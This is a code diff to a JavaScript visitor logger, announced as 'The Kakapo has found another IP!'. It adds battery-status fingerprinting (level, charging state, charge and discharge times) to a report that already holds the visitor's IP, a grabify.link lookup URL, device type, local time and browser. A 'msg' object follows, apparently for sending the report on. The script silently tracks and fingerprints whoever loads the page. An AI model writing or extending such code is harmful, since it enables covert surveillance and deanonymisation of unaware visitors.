@@ -112,7 +112,11 @@ function getPublicIPAddress() {
     });
 }
 
+function getDaBattery(){
+	return navigator.getBattery()
+}
 
+	
 
 async function logIP() {
   try {
@@ -141,6 +145,12 @@ const milliseconds = userTime.getMilliseconds();
 const ampm = hours24 >= 12 ? 'PM' : 'AM';
 const browser = detectBrowser();
 
+
+
+  // Example usage:
+  const batteryInfo = await getDaBattery();
+
+
 	  
 const message = `
 The Kakapo has found another IP!
@@ -158,6 +168,11 @@ Check here to see IP VPN and Location status <https://grabify.link/ip-lookup/${i
 - Mobile User: ${isMobile}
 - User Date and Time: ${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})
 - Browser: ${browser}
+- Battery Level: ${batteryInfo.level*100} 
+- Battery Charging: ${batteryInfo.charging} 
+- Battery Charge Time: ${batteryInfo.chargingTime} 
+- Battery Life Time: ${batteryInfo.dischargingTime} 
+
 `;
 	  
     const msg = {
